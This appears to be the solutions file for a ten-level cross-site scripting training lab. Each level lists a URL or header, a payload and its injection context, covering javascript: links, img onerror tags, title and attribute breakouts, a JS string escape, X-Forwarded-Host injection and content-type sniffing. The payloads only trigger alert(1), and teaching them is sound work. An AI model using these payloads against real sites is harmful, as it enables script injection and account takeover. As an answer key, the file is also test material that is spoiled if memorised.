# bugbounty — solutions

Patterns from real bug-bounty reports / CVEs: OAuth flows, JWT/reset tokens, upload previews, third-party widgets, cache poisoning.

### bugbounty-level1

`/bugbounty/level1/?redirect_uri=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: <a href='…'> — javascript: scheme

### bugbounty-level2

`/bugbounty/level2/?error=x&error_description=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: raw reflection in <p> body

### bugbounty-level3

`/bugbounty/level3/?q=%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</title><script>alert(1)</script>`
- context: inside <title>…</title> — close title then inject

### bugbounty-level4

`/bugbounty/level4/?token=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: <input type="hidden" value="…"> attribute breakout

### bugbounty-level5

`/bugbounty/level5/?filename=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: filename reflected raw inside <figcaption>

### bugbounty-level6

`/bugbounty/level6/?shortname=%27;alert(1);//`

- payload: `';alert(1);//`
- context: inside single-quoted JS string `this.page.identifier = '…';`

### bugbounty-level7

`[Header] /bugbounty/level7/`

- header: `X-Forwarded-Host: x"><script>alert(1)</script>`
- context: <base href="https://HOST/"> — break out via X-Forwarded-Host

### bugbounty-level8

`/bugbounty/level8/?ref=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: ref reflected raw in <h2> body

### bugbounty-level9

`/bugbounty/level9/?email=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: quotes encoded but angle brackets pass through; raw reflection in <strong> body

### bugbounty-level10

`/bugbounty/level10/?msg=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: application/json without nosniff; HTML body sniffed as text/html
